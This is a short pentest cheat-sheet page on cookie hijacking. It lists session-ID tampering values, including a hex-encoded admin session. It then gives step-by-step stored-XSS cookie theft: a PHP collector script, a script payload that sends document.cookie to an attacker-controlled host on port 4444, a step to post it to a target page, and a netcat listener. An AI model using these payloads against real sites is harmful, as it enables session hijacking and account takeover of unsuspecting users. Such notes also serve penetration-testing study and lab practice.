---
title: Cookie Hijacking
desc: A methodology of manipulating, grabbing cookies.
tags: [Burp, Cookie, Netcat, Web]
alts: [XSS]
render_with_liquid: false
---

## 1. Cookie Manipulation

```html
Cookie: PHPSESSID=0
Cookie: PHPSESSID=1
Cookie: PHPSESSID=999

<!-- ASCII Hex -->
Cookie: PHPSESSID=3836382d61646d696e
```

<br />

## 2. PHP Cookie Grabbing with XSS

1. **Create the Payload for Grabbing the Cookie when the Other UserS will Access Your Machine.**

    In your local machine, create the payload to get the other cookie values.

    ```php
    // steal_cookie.php

    <?php echo $_GET['cookie']; ?>
    ```

2. **Create the JavaScript Code to Force Users to Access Your Machine which Shows the Victim's Cookie Value.**

    ```javascript
    <script>document.location = 'http://<attacker-ip>:4444/steal_cookie.php?cookie='+document.cookie</script>
    ```

3. **POST Request with This JavaScript Code to the Target Web Page.**

4. **Open Listner in Your Local Machine and Wait for the Other Users will Access the Target Web Page.**

    ```sh
    nc -lvnp 4444
    ```